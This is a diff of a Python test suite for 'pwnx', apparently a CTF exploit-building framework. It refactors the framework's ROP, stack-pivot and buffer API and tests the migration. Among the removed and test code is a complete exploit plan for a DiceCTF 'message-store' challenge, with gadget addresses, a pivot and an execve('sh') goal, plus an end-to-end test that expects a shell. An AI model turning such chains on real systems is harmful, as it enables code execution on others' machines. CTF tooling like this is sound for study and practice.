@@ -1,6 +1,8 @@
 from __future__ import annotations
 
 import ast
+import importlib
+import inspect
 import os
 from pathlib import Path
 import subprocess
@@ -8,6 +10,7 @@ import subprocess
 import pytest
 
 import pwnx
+import pwnx.advanced as advanced
 from elf_factory import make_elf
 from pwnx import Challenge, Trace, bytes_, choice, field, integer
 from pwnx.actions import Emit, Encoded, Sequence
@@ -32,43 +35,18 @@ MESSAGE_STORE_EXAMPLE = (
 MESSAGE_STORE_SUGAR = (
     Path(__file__).parents[1] / "examples" / "message_store_sugar.py"
 )
-DICE_CHALLENGE = Path(
+DICE_CHALLENGE_ENV = os.environ.get("PWNX_DICE_CHALLENGE")
+LOCAL_DICE_CHALLENGE = Path(
     "/Users/brandonli/Downloads/pwn-challenges/dice-2026-quals/"
     "pwn_message-store"
 )
-
-
-CANONICAL = """
-from pwnx import Challenge, bytes_, choice, field, integer, utf8
-
-x = Challenge("./challenge")
-store = x.protocol.menu(b"> ", name="store").define(
-    message=choice(b"1", field(b"Message?", bytes_(max_size=0x1000), "data")),
-    color=choice(b"2", field(b"> ", integer(delimiter=None), "index")),
-    show=choice(b"3"),
+DICE_CHALLENGE = (
+    Path(DICE_CHALLENGE_ENV).expanduser().resolve()
+    if DICE_CHALLENGE_ENV
+    else LOCAL_DICE_CHALLENGE
 )
-message = x.buffer(
-    "message", at=0x2f9e38, size=0x1000,
-    writer=store.message, constraints=[utf8()],
-)
-dispatch = x.control(x.indirect_call(
-    table=0x2f08e8, index=store.color,
-    target=message.qword(80), trigger=store.show,
-    state={"eax": message.address},
-))
-pivot = x.control(dispatch.pivot(
-    stack=message, pointer_register="eax", gadget=0x242d79,
-))
-gadgets = x.rop.palette(
-    pop={"rdi": 0x243565, "rsi": 0x243431, "rcx": 0x247566},
-    zero={"rax": 0x247431},
-    move={("rdx", "rax"): 0x2b184e, ("rax", "rcx"): 0x2b4e73},
-    syscall=0x2a6602,
-    constraints=[utf8()],
-)
-x.want(x.execve("sh"), via=pivot, using=gadgets)
-x.run()
-"""
+
+CANONICAL = MESSAGE_STORE_SUGAR.read_text()
 
 
 class ScriptedTube(Tube):
@@ -121,7 +99,8 @@ def configured_control(tmp_path: Path):
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
     encoding = pwnx.utf8()
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message",
         at=BUFFER,
         size=0x1000,
@@ -138,13 +117,12 @@ def configured_control(tmp_path: Path):
         )
     )
     pivot = challenge.control(
-        dispatch.pivot(
-            stack=message,
-            pointer_register="eax",
-            gadget=PIVOT,
+        advanced.pivot(
+            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
         )
     )
-    gadgets = challenge.rop.palette(
+    gadgets = advanced.rop_palette(
+        challenge,
         pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
         zero={"rax": XOR_EAX},
         move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
@@ -180,21 +158,23 @@ def sugar_challenge(tmp_path: Path):
     dispatch = challenge.control(
         store.color.indexes(
             table=TABLE,
-            target=message[PIVOT_OFFSET],
+            target=message.qword(PIVOT_OFFSET),
             trigger=store.show,
             eax=message,
         )
     )
-    pivot = challenge.control(dispatch.pivot(eax=message, gadget=PIVOT))
-    palette = challenge.rop(
-        pop_rdi=POP_RDI,
-        pop_rsi=POP_RSI,
-        zero_rax=XOR_EAX,
-        move_rdx_rax=MOV_EDX_EAX,
-        pop_rcx=POP_RCX,
-        move_rax_rcx=MOV_EAX_ECX,
-        syscall=SYSCALL,
-        constraint=pwnx.utf8(),
+    pivot = challenge.control(
+        dispatch.pivot(register="eax", stack=message, gadget=PIVOT)
+    )
+    palette = (
+        challenge.rop(pwnx.utf8())
+        .pop("rdi", POP_RDI)
+        .pop("rsi", POP_RSI)
+        .zero("rax", XOR_EAX)
+        .move("rdx", "rax", MOV_EDX_EAX)
+        .pop("rcx", POP_RCX)
+        .move("rax", "rcx", MOV_EAX_ECX)
+        .syscall(SYSCALL)
     )
     challenge.want(
         challenge.execve("sh"), via=pivot, using=palette, terminal=False
@@ -224,7 +204,8 @@ def attach_execve_goal(
     table: int,
 ):
     encoding = pwnx.utf8()
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         f"message-{address:x}",
         at=address,
         size=0x1000,
@@ -241,9 +222,12 @@ def attach_execve_goal(
         )
     )
     pivot = challenge.control(
-        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
+        advanced.pivot(
+            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
+        )
     )
-    palette = challenge.rop.palette(
+    palette = advanced.rop_palette(
+        challenge,
         pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
         zero={"rax": XOR_EAX},
         move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
@@ -351,7 +335,9 @@ def lowered_action_tree(plan) -> tuple:
     )
 
 
-def test_canonical_solve_contains_no_manual_rop_or_index_arithmetic() -> None:
+def test_canonical_solve_contains_no_manual_rop_or_index_arithmetic(
+    tmp_path: Path,
+) -> None:
     tree = ast.parse(CANONICAL)
     calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
     attributes = {
@@ -370,7 +356,12 @@ def test_canonical_solve_contains_no_manual_rop_or_index_arithmetic() -> None:
         for node in ast.walk(tree)
     )
     assert not any(isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda)) for node in ast.walk(tree))
-    assert len(calls) < 24
+    assert len(calls) < 30
+
+    payload, color, trailing = extract_payload(sugar_challenge(tmp_path).plan())
+    payload.decode("utf-8")
+    assert color == 4788
+    assert trailing == b"3\n"
 
 
 def test_shipped_message_store_example_uses_the_constrained_frontend() -> None:
@@ -384,8 +375,8 @@ def test_shipped_message_store_example_uses_the_constrained_frontend() -> None:
     assert not {"p64", "u64", "Payload", "ROPCompiler", "word"} & names
     assert not {"build", "to_bytes"} & attributes
     assert "indirect_call" in attributes
-    assert "pivot" in attributes
-    assert "palette" in attributes
+    assert "pivot" in attributes or "pivot" in names
+    assert "palette" in attributes or "rop_palette" in names
     assert "execve" in attributes
     assert not any(
         isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda))
@@ -467,7 +458,7 @@ def test_menu_sugar_infers_fields_and_operations_are_callable(tmp_path: Path) ->
     assert show.name.startswith("store.show#")
 
 
-def test_buffer_sugar_writer_and_indexing_match_explicit_surface(tmp_path: Path) -> None:
+def test_buffer_sugar_writer_and_qword_match_explicit_surface(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = challenge.menu(b"> ", message=(1, b"Message?", bytes))
     message = challenge.buffer(
@@ -477,8 +468,8 @@ def test_buffer_sugar_writer_and_indexing_match_explicit_surface(tmp_path: Path)
     assert message.name == "buffer"
     assert message.address == BUFFER
     assert message.constraints == (pwnx.utf8(),)
-    assert message[80].offset == 80
-    assert message[80].size == 8
+    assert message.qword(80).offset == 80
+    assert message.qword(80).size == 8
 
 
 def test_buffer_sugar_binds_only_selected_writer_codec_and_shares_ids(
@@ -677,7 +668,7 @@ def test_index_operation_sugar_is_owned_by_its_challenge(tmp_path: Path) -> None
 
     dispatch = store.color.indexes(
         table=TABLE,
-        target=message[80],
+        target=message.qword(80),
         trigger=store.show,
         eax=message,
     )
@@ -686,7 +677,7 @@ def test_index_operation_sugar_is_owned_by_its_challenge(tmp_path: Path) -> None
     assert dispatch.index == 4788
 
 
-def test_pivot_register_keyword_sugar_normalizes_alias(tmp_path: Path) -> None:
+def test_canonical_pivot_normalizes_register_alias(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = challenge.menu(
         b"> ",
@@ -700,33 +691,105 @@ def test_pivot_register_keyword_sugar_normalizes_alias(tmp_path: Path) -> None:
     ).written_by(store.message)
     dispatch = store.color.indexes(
         table=TABLE,
-        target=message[80],
+        target=message.qword(80),
         trigger=store.show,
         eax=message,
     )
 
-    pivot = dispatch.pivot(eax=message, gadget=PIVOT)
+    pivot = dispatch.pivot(register="eax", stack=message, gadget=PIVOT)
 
     assert pivot.pointer_register == "rax"
     assert pivot.stack is message
 
 
-def test_callable_rop_sugar_maps_keywords_to_semantic_palette(tmp_path: Path) -> None:
+def test_fluent_rop_builder_is_public_and_autocomplete_discoverable(
+    tmp_path: Path,
+) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    builder = challenge.rop(pwnx.utf8())
 
-    palette = challenge.rop(
-        pop_rdi=POP_RDI,
-        zero_eax=XOR_EAX,
-        move_edx_eax=MOV_EDX_EAX,
-        syscall=SYSCALL,
-        constraint=pwnx.utf8(),
+    assert type(builder).__name__ == "RopBuilder"
+    for method in ("pop", "zero", "move", "syscall"):
+        assert callable(getattr(builder, method))
+
+
+def test_fluent_rop_builder_is_immutable(tmp_path: Path) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    empty = challenge.rop(pwnx.utf8())
+    with_rdi = empty.pop("rdi", POP_RDI)
+    with_rsi = with_rdi.pop("rsi", POP_RSI)
+
+    empty_palette = empty.syscall(SYSCALL)
+    rdi_palette = with_rdi.syscall(SYSCALL)
+    rsi_palette = with_rsi.syscall(SYSCALL)
+
+    assert empty is not with_rdi
+    assert with_rdi is not with_rsi
+    assert dict(empty_palette.pop) == {}
+    assert dict(rdi_palette.pop) == {"rdi": POP_RDI}
+    assert dict(rsi_palette.pop) == {"rdi": POP_RDI, "rsi": POP_RSI}
+
+
+@pytest.mark.parametrize(
+    ("first", "second", "message"),
+    [
+        (POP_RDI, POP_RDI, "duplicate"),
+        (POP_RDI, POP_RSI, "conflict"),
+    ],
+)
+def test_fluent_rop_builder_rejects_duplicate_or_conflicting_assignments(
+    tmp_path: Path,
+    first: int,
+    second: int,
+    message: str,
+) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    builder = challenge.rop(pwnx.utf8()).pop("rdi", first)
+
+    with pytest.raises(PlanningError, match=message):
+        builder.pop("rdi", second)
+
+
+@pytest.mark.parametrize(
+    "operation",
+    [
+        lambda builder: builder.pop("mystery", POP_RDI),
+        lambda builder: builder.zero("wat", XOR_EAX),
+        lambda builder: builder.move("rax", "unknown", MOV_EAX_ECX),
+    ],
+)
+def test_fluent_rop_builder_rejects_unknown_registers(
+    tmp_path: Path,
+    operation,
+) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    with pytest.raises(PlanningError, match="unknown|register"):
+        operation(challenge.rop(pwnx.utf8()))
+
+
+def test_fluent_rop_builder_normalizes_register_aliases(tmp_path: Path) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    palette = (
+        challenge.rop(pwnx.utf8())
+        .pop("r8d", POP_RDI)
+        .zero("eax", XOR_EAX)
+        .move("edx", "eax", MOV_EDX_EAX)
+        .syscall(SYSCALL)
     )
 
-    assert palette.pop["rdi"] == POP_RDI
+    assert palette.pop["r8"] == POP_RDI
     assert palette.zero["rax"] == XOR_EAX
     assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
-    assert palette.syscall == SYSCALL
-    assert palette.constraints == (pwnx.utf8(),)
+
+
+def test_readme_uses_one_canonical_fluent_rop_path() -> None:
+    readme = (Path(__file__).parents[1] / "README.md").read_text()
+
+    assert "x.rop(utf8())" in readme
+    assert '.pop("rdi"' in readme
+    assert '.move("rdx", "rax"' in readme
+    assert ".syscall(" in readme
+    assert "pop_rdi=" not in readme
 
 
 @pytest.mark.parametrize(
@@ -838,7 +901,8 @@ def test_sugar_trace_replays_with_the_same_menu_identity(tmp_path: Path) -> None
 
 def test_buffer_rejects_qword_slot_outside_declared_storage(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message",
         at=BUFFER,
         size=32,
@@ -852,7 +916,8 @@ def test_buffer_rejects_qword_slot_outside_declared_storage(tmp_path: Path) -> N
 def test_indexed_call_rejects_unaligned_table_target(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message",
         at=BUFFER,
         size=0x100,
@@ -872,7 +937,8 @@ def test_indexed_call_rejects_unaligned_table_target(tmp_path: Path) -> None:
 def test_pivot_requires_register_to_point_at_declared_buffer(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message",
         at=BUFFER,
         size=0x100,
@@ -887,13 +953,16 @@ def test_pivot_requires_register_to_point_at_declared_buffer(tmp_path: Path) -> 
         state={"eax": message.address + 8},
     )
     with pytest.raises(PlanningError, match="eax|buffer|points"):
-        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
+        advanced.pivot(
+            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
+        )
 
 
 def test_palette_rejects_gadget_address_that_violates_utf8(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     with pytest.raises(ConstraintError, match="utf-8|encoding|gadget"):
-        challenge.rop.palette(
+        advanced.rop_palette(
+            challenge,
             pop={"rdi": 0x242D80},
             syscall=SYSCALL,
             constraints=(pwnx.utf8(),),
@@ -903,7 +972,8 @@ def test_palette_rejects_gadget_address_that_violates_utf8(tmp_path: Path) -> No
 def test_execve_reports_missing_register_realization(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message",
         at=BUFFER,
         size=0x1000,
@@ -920,9 +990,12 @@ def test_execve_reports_missing_register_realization(tmp_path: Path) -> None:
         )
     )
     pivot = challenge.control(
-        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
+        advanced.pivot(
+            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
+        )
     )
-    incomplete = challenge.rop.palette(
+    incomplete = advanced.rop_palette(
+        challenge,
         pop={"rdi": POP_RDI, "rsi": POP_RSI},
         syscall=SYSCALL,
         constraints=(pwnx.utf8(),),
@@ -953,7 +1026,8 @@ def test_dispatch_slot_rejects_rop_qword_overlap(
 ) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
+    message = advanced.controlled_buffer(
+        challenge,
         "message", at=BUFFER, size=0x1000, writer=store.message,
         constraints=(pwnx.utf8(),),
     )
@@ -967,9 +1041,12 @@ def test_dispatch_slot_rejects_rop_qword_overlap(
         )
     )
     pivot = challenge.control(
-        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
+        advanced.pivot(
+            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
+        )
     )
-    palette = challenge.rop.palette(
+    palette = advanced.rop_palette(
+        challenge,
         pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
         zero={"rax": XOR_EAX},
         move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
@@ -1017,7 +1094,8 @@ def test_rop_palette_rejects_foreign_challenge(tmp_path: Path) -> None:
     second_path.mkdir()
     first = configured_challenge(first_path)
     second = configured_challenge(second_path)
-    foreign = second.rop.palette(
+    foreign = advanced.rop_palette(
+        second,
         pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
         zero={"rax": XOR_EAX},
         move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
@@ -1032,7 +1110,8 @@ def test_rop_palette_rejects_foreign_challenge(tmp_path: Path) -> None:
 
 def test_rop_palette_carries_target_artifact_identity(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
-    palette = challenge.rop.palette(
+    palette = advanced.rop_palette(
+        challenge,
         pop={"rdi": POP_RDI},
         syscall=SYSCALL,
         constraints=(pwnx.utf8(),),
@@ -1056,9 +1135,10 @@ def test_pinned_palette_rejects_ambiguous_or_extra_operands(
 ) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     with pytest.raises(PlanningError, match="gadget|semantic|operand|unsupported"):
-        challenge.rop.palette(
+        advanced.rop_palette(
+            challenge,
             pinned={instruction: XOR_EAX},
-            constraint=pwnx.utf8(),
+            constraints=(pwnx.utf8(),),
         )
 
 
@@ -1066,7 +1146,8 @@ def test_pinned_palette_normalizes_32_and_64_bit_register_aliases(
     tmp_path: Path,
 ) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
-    palette = challenge.rop.palette(
+    palette = advanced.rop_palette(
+        challenge,
         pinned={
             "pop rdi; ret": POP_RDI,
             "xor eax, eax; ret": XOR_EAX,
@@ -1074,7 +1155,7 @@ def test_pinned_palette_normalizes_32_and_64_bit_register_aliases(
             "mov eax, ecx; ret": MOV_EAX_ECX,
             "syscall": SYSCALL,
         },
-        constraint=pwnx.utf8(),
+        constraints=(pwnx.utf8(),),
     )
 
     assert palette.zero["rax"] == XOR_EAX
@@ -1167,20 +1248,22 @@ def test_explicit_palette_rejects_unknown_registers(
 ) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     with pytest.raises(PlanningError, match="unknown|register"):
-        challenge.rop.palette(**declaration)
+        advanced.rop_palette(challenge, **declaration)
 
 
 def test_pinned_palette_rejects_unknown_register(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     with pytest.raises(PlanningError, match="unknown|register|gadget"):
-        challenge.rop.palette(pinned={"pop mystery; ret": POP_RDI})
+        advanced.rop_palette(
+            challenge, pinned={"pop mystery; ret": POP_RDI}
+        )
 
 
 def test_indirect_call_state_rejects_unknown_register(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
-        "message", at=BUFFER, size=0x1000, writer=store.message
+    message = advanced.controlled_buffer(
+        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
     )
     with pytest.raises(PlanningError, match="unknown|register"):
         challenge.indirect_call(
@@ -1195,8 +1278,8 @@ def test_indirect_call_state_rejects_unknown_register(tmp_path: Path) -> None:
 def test_pivot_rejects_unknown_pointer_register(tmp_path: Path) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
-        "message", at=BUFFER, size=0x1000, writer=store.message
+    message = advanced.controlled_buffer(
+        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
     )
     dispatch = challenge.indirect_call(
         table=TABLE,
@@ -1206,7 +1289,8 @@ def test_pivot_rejects_unknown_pointer_register(tmp_path: Path) -> None:
         state={"rax": message.address},
     )
     with pytest.raises(PlanningError, match="unknown|register"):
-        dispatch.pivot(
+        advanced.pivot(
+            dispatch,
             stack=message,
             pointer_register="mystery",
             gadget=PIVOT,
@@ -1218,10 +1302,11 @@ def test_register_aliases_are_canonical_across_palette_state_and_pivot(
 ) -> None:
     challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
     store = store_menu(challenge)
-    message = challenge.buffer(
-        "message", at=BUFFER, size=0x1000, writer=store.message
+    message = advanced.controlled_buffer(
+        challenge, "message", at=BUFFER, size=0x1000, writer=store.message
     )
-    palette = challenge.rop.palette(
+    palette = advanced.rop_palette(
+        challenge,
         pop={"r8d": POP_RDI},
         zero={"eax": XOR_EAX},
         move={("edx", "eax"): MOV_EDX_EAX},
@@ -1233,10 +1318,8 @@ def test_register_aliases_are_canonical_across_palette_state_and_pivot(
         trigger=store.show,
         state={"eax": message.address},
     )
-    pivot = dispatch.pivot(
-        stack=message,
-        pointer_register="eax",
-        gadget=PIVOT,
+    pivot = advanced.pivot(
+        dispatch, stack=message, pointer_register="eax", gadget=PIVOT
     )
 
     assert palette.pop["r8"] == POP_RDI
@@ -1249,7 +1332,9 @@ def test_register_aliases_are_canonical_across_palette_state_and_pivot(
 @pytest.mark.skipif(
     os.environ.get("PWNX_RUN_CTF_E2E") != "1"
     or not (DICE_CHALLENGE / "challenge").is_file(),
-    reason="set PWNX_RUN_CTF_E2E=1 with the Dice challenge artifact present",
+    reason=(
+        "set PWNX_RUN_CTF_E2E=1 and PWNX_DICE_CHALLENGE=/path/to/challenge-dir"
+    ),
 )
 def test_real_dice_message_store_solve_gets_shell() -> None:
     repository = Path(__file__).parents[1]
@@ -1281,3 +1366,219 @@ def test_real_dice_message_store_solve_gets_shell() -> None:
 
     assert result.returncode == 0, result.stdout.decode(errors="replace")
     assert b"__PWNX_SHELL__" in result.stdout
+
+
+@pytest.mark.skipif(
+    not (DICE_CHALLENGE / "solve_pwnx.py").is_file(),
+    reason=(
+        "set PWNX_DICE_CHALLENGE=/path/to/challenge-dir to inspect the external solve"
+    ),
+)
+def test_actual_solve_uses_only_the_canonical_05_surface() -> None:
+    source = (DICE_CHALLENGE / "solve_pwnx.py").read_text()
+    tree = ast.parse(source)
+    attributes = {
+        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
+    }
+
+    assert "qword" in attributes
+    assert "__getitem__" not in attributes
+    assert ".pivot(register=" in source
+    assert ".pivot(eax=" not in source
+    assert "pointer_register=" not in source
+    assert "x.rop(" in source
+    assert ".pop(" in source
+    assert ".zero(" in source
+    assert ".move(" in source
+    assert ".syscall(" in source
+    assert "pop_rdi=" not in source
+    assert ".palette(" not in source
+
+
+def test_primary_rop_namespace_exposes_only_the_fluent_path(tmp_path: Path) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+
+    assert not hasattr(challenge.rop, "palette")
+    assert not hasattr(challenge.rop, "pinned")
+    builder = challenge.rop(pwnx.utf8())
+    for method in ("pop", "zero", "move", "syscall"):
+        assert callable(getattr(builder, method))
+
+
+@pytest.mark.parametrize(
+    "kwargs",
+    [
+        {"pop_rdi": POP_RDI},
+        {"encoding": "utf8"},
+        {"constraints": (pwnx.utf8(),)},
+    ],
+)
+def test_removed_primary_rop_aliases_fail_with_migration_diagnostic(
+    tmp_path: Path,
+    kwargs: dict,
+) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    with pytest.raises(
+        (TypeError, PlanningError),
+        match="removed|migration|advanced|x\\.rop\\(utf8|fluent",
+    ):
+        challenge.rop(**kwargs)
+
+
+def test_buffer_index_alias_is_removed_in_favor_of_qword(tmp_path: Path) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    message = challenge.buffer(at=BUFFER, size=0x1000, encoding="utf8").written_by(
+        challenge.menu(b"> ", message=(1, b"Message?", bytes)).message
+    )
+
+    with pytest.raises(
+        (TypeError, PlanningError), match="qword|removed|migration|subscriptable"
+    ):
+        _ = message[80]
+    assert message.qword(80).offset == 80
+
+
+@pytest.mark.parametrize(
+    "kwargs",
+    [
+        {"eax": "buffer"},
+        {"pointer_register": "eax", "stack": "buffer"},
+    ],
+)
+def test_pivot_aliases_are_removed_in_favor_of_register_and_stack(
+    tmp_path: Path,
+    kwargs: dict,
+) -> None:
+    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
+    store = challenge.menu(
+        b"> ", name="store", message=(1, b"Message?", bytes),
+        color=(2, b"> ", int), show=3,
+    )
+    message = challenge.buffer(at=BUFFER, size=0x1000, encoding="utf8").written_by(
+        store.message
+    )
+    call = store.color.indexes(
+        table=TABLE,
+        target=message.qword(80),
+        trigger=store.show,
+        eax=message,
+    )
+    supplied = {
+        key: message if value == "buffer" else value
+        for key, value in kwargs.items()
+    }
+
+    with pytest.raises(
+        (TypeError, PlanningError),
+        match="register|stack|removed|migration|unexpected keyword",
+    ):
+        call.pivot(gadget=PIVOT, **supplied)
+
+
+def test_primary_buffer_signature_has_one_canonical_writer_and_constraint_path() -> None:
+    parameters = inspect.signature(Challenge.buffer).parameters
+
+    assert "encoding" in parameters
+    for removed in ("writer", "write", "constraint", "constraints"):
+        assert removed not in parameters
+
+
+def test_primary_all_excludes_advanced_implementation_types() -> None:
+    excluded = {
+        "Action",
+        "EffectContract",
+        "Payload",
+        "RopPalette",
+        "RopBuilder",
+        "BufferSlice",
+        "ControlledBuffer",
+    }
+    assert not excluded & set(pwnx.__all__)
+
+
+def test_advanced_explicit_surface_matches_canonical_ir_payload_and_replay(
+    tmp_path: Path,
+) -> None:
+    advanced = importlib.import_module("pwnx.advanced")
+    canonical_path = tmp_path / "canonical"
+    advanced_path = tmp_path / "advanced"
+    canonical_path.mkdir()
+    advanced_path.mkdir()
+    canonical = sugar_challenge(canonical_path)
+
+    explicit = Challenge(make_elf(advanced_path / "challenge", pie=False))
+    store = store_menu(explicit)
+    message = advanced.controlled_buffer(
+        explicit,
+        "message",
+        at=BUFFER,
+        size=0x1000,
+        writer=store.message,
+        constraints=(pwnx.utf8(),),
+    )
+    dispatch = explicit.control(
+        explicit.indirect_call(
+            table=TABLE,
+            index=store.color,
+            target=message.qword(80),
+            trigger=store.show,
+            state={"eax": message.address},
+        )
+    )
+    pivot = explicit.control(
+        dispatch.pivot(register="eax", stack=message, gadget=PIVOT)
+    )
+    palette = advanced.rop_palette(
+        explicit,
+        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
+        zero={"rax": XOR_EAX},
+        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
+        syscall=SYSCALL,
+        constraints=(pwnx.utf8(),),
+    )
+    explicit.want(
+        explicit.execve("sh"), via=pivot, using=palette, terminal=False
+    )
+
+    canonical_plan = canonical.plan()
+    explicit_plan = explicit.plan()
+    assert canonical_plan.to_dict() == explicit_plan.to_dict()
+    assert extract_payload(canonical_plan) == extract_payload(explicit_plan)
+    assert lowered_action_tree(canonical_plan) == lowered_action_tree(explicit_plan)
+
+    trace = Trace()
+    live = ScriptedTube(b"> Message?> > > ")
+    with explicit_plan.run(transport=live, trace=trace):
+        pass
+    with explicit_plan.run(transport=FailingTube(), replay=trace):
+        pass
+
+
+def test_readme_documents_only_the_canonical_primary_syntax() -> None:
+    readme = (Path(__file__).parents[1] / "README.md").read_text()
+
+    assert "message.qword(80)" in readme
+    assert '.pivot(register="eax", stack=message' in readme
+    assert "x.rop(utf8())" in readme
+    assert "pop_rdi=" not in readme
+    assert "message[80]" not in readme
+    assert ".pivot(eax=" not in readme
+    assert ".rop.palette(" not in readme
+
+
+def test_removed_aliases_are_documented_only_in_migration_guide() -> None:
+    root = Path(__file__).parents[1]
+    migration = (root / "docs" / "MIGRATION_0_2_TO_0_3.md").read_text()
+    ordinary = "\n".join(
+        (root / path).read_text()
+        for path in (
+            "README.md",
+            "SPEC.md",
+            "docs/V03_ARCHITECTURE.md",
+            "docs/PARITY.md",
+        )
+    )
+
+    for alias in ("pop_rdi=", "message[80]", ".pivot(eax=", ".rop.palette("):
+        assert alias in migration
+        assert alias not in ordinary
